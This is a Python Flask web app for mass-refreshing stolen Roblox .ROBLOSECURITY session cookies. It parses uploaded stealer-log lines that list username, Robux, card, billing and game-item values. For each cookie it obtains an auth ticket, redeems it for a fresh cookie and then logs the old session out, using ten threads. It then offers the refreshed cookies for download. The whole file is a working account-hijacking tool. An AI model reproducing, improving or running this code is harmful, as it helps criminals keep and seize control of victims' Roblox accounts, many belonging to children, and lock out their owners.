import os
import re
import json
import time
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from flask import Flask, render_template, request, jsonify, send_file
import requests as http_requests

MAX_WORKERS = 10  # Number of parallel threads

app = Flask(__name__)

# Global state for tracking progress
refresh_state = {
    'total': 0,
    'processed': 0,
    'success': 0,
    'failed': 0,
    'results': [],
    'running': False,
    'done': False,
}
state_lock = threading.Lock()


def extract_cookie(line):
    """Extract the .ROBLOSECURITY cookie value from a line."""
    # Clean the line first
    line = line.strip().rstrip('\r\n')
    
    # Try to find cookie after "Cookie:" label
    match = re.search(r'Cookie:\s*(_\|WARNING[^|]*\|_[A-Za-z0-9_\-\.]+)', line)
    if match:
        return match.group(1).strip()
    
    # If the line itself is just a cookie
    if line.startswith('_|WARNING'):
        return line.strip()
    
    # Try to find any WARNING cookie pattern anywhere in the line
    match = re.search(r'(_\|WARNING[^|]*\|_[A-Za-z0-9_\-\.]+)', line)
    if match:
        return match.group(1).strip()
    
    return None


def extract_metadata(line):
    """Extract metadata from a cookie line (username, robux, etc.). Supports multiple formats."""
    metadata = {}
    patterns = {
        'Username': r'Username:\s*([^|]+)',
        'Robux': r'Robux:\s*([^|]+)',
        'Donate': r'(?:Donate All|Donate \(All-Time\)):\s*([^|]+)',
        'Pending': r'Pending:\s*([^|]+)',
        'RAP': r'(?:RAP|Rap):\s*([^|]+)',
        'Card': r'Card:\s*([^|]+)',
        'Email': r'(?:Email|Mail):\s*([^|]+)',
        'Billing': r'Billing:\s*([^|]+)',
        'Premium': r'Premium:\s*([^|]+)',
        'Pet Sim 99': r'Pet Sim 99:\s*([^|]+)',
        'Adopt Me': r'Adopt Me:\s*([^|]+)',
        'MM2': r'MM2:\s*([^|]+)',
        'Steal a brainrot': r'Steal a brainrot:\s*([^|]+)',
    }
    for key, pattern in patterns.items():
        match = re.search(pattern, line)
        if match:
            metadata[key] = match.group(1).strip()
    return metadata


def get_csrf_token(cookie_value):
    """Get CSRF token from Roblox auth API without invalidating the session.
    Uses a POST to auth-ticket endpoint which returns 403 + csrf token without logging out.
    """
    session = http_requests.Session()
    session.cookies.set('.ROBLOSECURITY', cookie_value, domain='.roblox.com')
    
    try:
        # Use authentication-ticket endpoint to get CSRF token
        # This returns 403 with x-csrf-token header WITHOUT logging out
        resp = session.post(
            'https://auth.roblox.com/v1/authentication-ticket',
            headers={
                'User-Agent': 'Roblox/WinInet',
                'Referer': 'https://www.roblox.com/',
                'Content-Type': 'application/json',
            },
            json={},
            timeout=15
        )
        csrf = resp.headers.get('x-csrf-token')
        return csrf, session
    except Exception as e:
        return None, None


def refresh_single_cookie(cookie_value):
    """
    Refresh a single Roblox cookie using the auth ticket method.
    Returns (new_cookie, error_message).
    """
    try:
        # Step 1: Get CSRF token
        csrf_token, session = get_csrf_token(cookie_value)
        if not csrf_token:
            return None, "Failed to get CSRF token (cookie may be invalid)"
        
        # Step 2: Get authentication ticket
        session.cookies.set('.ROBLOSECURITY', cookie_value, domain='.roblox.com')
        headers = {
            'x-csrf-token': csrf_token,
            'User-Agent': 'Roblox/WinInet',
            'Referer': 'https://www.roblox.com/',
            'Content-Type': 'application/json',
            'Accept': 'application/json',
        }
        
        resp = session.post(
            'https://auth.roblox.com/v1/authentication-ticket',
            headers=headers,
            json={},
            timeout=15
        )
        
        ticket = resp.headers.get('rbx-authentication-ticket')
        if not ticket:
            # Try with empty string body
            headers2 = {
                'x-csrf-token': csrf_token,
                'User-Agent': 'Roblox/WinInet',
                'Referer': 'https://www.roblox.com/',
                'Content-Type': 'application/json',
                'Accept': 'application/json',
            }
            resp = session.post(
                'https://auth.roblox.com/v1/authentication-ticket',
                headers=headers2,
                data='',
                timeout=15
            )
            ticket = resp.headers.get('rbx-authentication-ticket')
        
        if not ticket:
            return None, f"Failed to get auth ticket (status: {resp.status_code})"
        
        # Step 3: Redeem the ticket for a new cookie
        new_session = http_requests.Session()
        redeem_headers = {
            'rbxauthenticationnegotiation': '1',
            'User-Agent': 'Roblox/WinInet',
            'Content-Type': 'application/json',
            'Accept': 'application/json',
        }
        redeem_body = {
            'authenticationTicket': ticket
        }
        
        resp = new_session.post(
            'https://auth.roblox.com/v1/authentication-ticket/redeem',
            json=redeem_body,
            headers=redeem_headers,
            timeout=15
        )
        
        # Extract new cookie from response
        new_cookie = None
        for cookie in new_session.cookies:
            if cookie.name == '.ROBLOSECURITY':
                new_cookie = cookie.value
                break
        
        # Also check Set-Cookie header (check all set-cookie headers)
        if not new_cookie:
            # requests stores multiple set-cookie in response.headers as combined
            raw_headers = resp.raw.headers if hasattr(resp, 'raw') and resp.raw else {}
            set_cookies = resp.headers.get('set-cookie', '')
            # Also check in raw headers for multiple set-cookie entries
            if hasattr(raw_headers, 'getlist'):
                set_cookie_list = raw_headers.getlist('set-cookie')
            else:
                set_cookie_list = [set_cookies]
            
            for sc in set_cookie_list:
                match = re.search(r'\.ROBLOSECURITY=(_\|WARNING[^;]+)', sc)
                if match:
                    new_cookie = match.group(1)
                    break
        
        if new_cookie:
            # Invalidate old cookie via logout to make it unusable
            try:
                session.post(
                    'https://auth.roblox.com/v2/logout',
                    headers={
                        'x-csrf-token': csrf_token,
                        'User-Agent': 'Roblox/WinInet',
                        'Referer': 'https://www.roblox.com/',
                        'Content-Type': 'application/json',
                    },
                    json={},
                    timeout=5
                )
            except Exception:
                pass # Ignore errors during logout
            
            return new_cookie, None
        else:
            return None, f"No new cookie in response (status: {resp.status_code})"
            
    except http_requests.exceptions.Timeout:
        return None, "Request timed out"
    except http_requests.exceptions.ConnectionError:
        return None, "Connection error"
    except Exception as e:
        return None, f"Error: {str(e)}"


def process_single_item(item):
    """Process a single cookie item (used by thread pool)."""
    original_line = item['original_line']
    cookie_value = item['cookie']
    metadata = item['metadata']
    username = metadata.get('Username', 'Unknown')
    
    new_cookie, error = refresh_single_cookie(cookie_value)
    
    result = {
        'username': username,
        'original_cookie': cookie_value,
        'new_cookie': new_cookie,
        'error': error,
        'metadata': metadata,
        'original_line': original_line,
    }
    
    if new_cookie:
        result['status'] = 'success'
        if 'Cookie:' in original_line:
            result['new_line'] = re.sub(
                r'Cookie:\s*_\|WARNING[^|]*\|_[A-Za-z0-9_\-\.]+',
                f'Cookie: {new_cookie}',
                original_line
            )
        else:
            result['new_line'] = new_cookie
    else:
        result['status'] = 'failed'
        result['new_line'] = original_line
    
    return result


def refresh_worker(cookies_data):
    """Worker thread to refresh all cookies using thread pool."""
    global refresh_state
    
    with state_lock:
        refresh_state['running'] = True
        refresh_state['done'] = False
        refresh_state['total'] = len(cookies_data)
        refresh_state['processed'] = 0
        refresh_state['success'] = 0
        refresh_state['failed'] = 0
        refresh_state['results'] = []
    
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        futures = {executor.submit(process_single_item, item): item for item in cookies_data}
        
        for future in as_completed(futures):
            try:
                result = future.result()
            except Exception as e:
                item = futures[future]
                result = {
                    'username': item['metadata'].get('Username', 'Unknown'),
                    'status': 'failed',
                    'error': str(e),
                    'new_line': item['original_line'],
                    'original_line': item['original_line'],
                    'original_cookie': item['cookie'],
                    'new_cookie': None,
                    'metadata': item['metadata'],
                }
            
            with state_lock:
                refresh_state['processed'] += 1
                if result.get('status') == 'success':
                    refresh_state['success'] += 1
                else:
                    refresh_state['failed'] += 1
                refresh_state['results'].append(result)
    
    with state_lock:
        refresh_state['running'] = False
        refresh_state['done'] = True


@app.route('/')
def index():
    return render_template('index.html')


@app.route('/upload', methods=['POST'])
def upload():
    global refresh_state
    
    if refresh_state.get('running'):
        return jsonify({'error': 'A refresh operation is already running'}), 400
    
    file = request.files.get('file')
    text = request.form.get('text', '')
    
    if file:
        content = file.read().decode('utf-8', errors='ignore')
    elif text:
        content = text
    else:
        return jsonify({'error': 'No file or text provided'}), 400
    
    # Parse cookies from content
    lines = content.split('\n')
    cookies_data = []
    
    for line in lines:
        line = line.strip().rstrip('\r')
        if not line:
            continue
        
        cookie = extract_cookie(line)
        if cookie:
            metadata = extract_metadata(line)
            cookies_data.append({
                'original_line': line,
                'cookie': cookie,
                'metadata': metadata,
            })
    
    if not cookies_data:
        return jsonify({'error': 'No valid cookies found in the file'}), 400
    
    # Reset state and start worker
    with state_lock:
        refresh_state = {
            'total': len(cookies_data),
            'processed': 0,
            'success': 0,
            'failed': 0,
            'results': [],
            'running': True,
            'done': False,
        }
    
    thread = threading.Thread(target=refresh_worker, args=(cookies_data,))
    thread.daemon = True
    thread.start()
    
    return jsonify({
        'message': f'Started refreshing {len(cookies_data)} cookies',
        'total': len(cookies_data)
    })


@app.route('/status')
def status():
    with state_lock:
        return jsonify({
            'total': refresh_state['total'],
            'processed': refresh_state['processed'],
            'success': refresh_state['success'],
            'failed': refresh_state['failed'],
            'running': refresh_state['running'],
            'done': refresh_state['done'],
            'results': refresh_state['results'][-10:],  # Last 10 results for live feed
        })


@app.route('/download')
def download():
    if not refresh_state.get('done'):
        return jsonify({'error': 'Refresh not complete yet'}), 400
    
    output_path = os.path.join(os.path.dirname(__file__), 'refreshed_cookies.txt')
    
    with open(output_path, 'w', encoding='utf-8') as f:
        for result in refresh_state['results']:
            if result['status'] == 'success':
                f.write(result['new_line'] + '\n\n')
    
    return send_file(output_path, as_attachment=True, download_name='refreshed_cookies.txt')


@app.route('/download_all')
def download_all():
    if not refresh_state.get('done'):
        return jsonify({'error': 'Refresh not complete yet'}), 400
    
    output_path = os.path.join(os.path.dirname(__file__), 'all_refreshed_cookies.txt')
    
    with open(output_path, 'w', encoding='utf-8') as f:
        for result in refresh_state['results']:
            f.write(result['new_line'] + '\n\n')
    
    return send_file(output_path, as_attachment=True, download_name='all_refreshed_cookies.txt')


@app.route('/download_report')
def download_report():
    if not refresh_state.get('done'):
        return jsonify({'error': 'Refresh not complete yet'}), 400
    
    output_path = os.path.join(os.path.dirname(__file__), 'refresh_report.txt')
    
    with open(output_path, 'w', encoding='utf-8') as f:
        f.write(f"=== Roblox Cookie Refresh Report ===\n")
        f.write(f"Total: {refresh_state['total']}\n")
        f.write(f"Success: {refresh_state['success']}\n")
        f.write(f"Failed: {refresh_state['failed']}\n")
        f.write(f"{'='*40}\n\n")
        
        for result in refresh_state['results']:
            f.write(f"Username: {result['username']}\n")
            f.write(f"Status: {result['status']}\n")
            if result.get('error'):
                f.write(f"Error: {result['error']}\n")
            f.write(f"---\n\n")
    
    return send_file(output_path, as_attachment=True, download_name='refresh_report.txt')


if __name__ == '__main__':
    app.run(debug=True, port=5000)
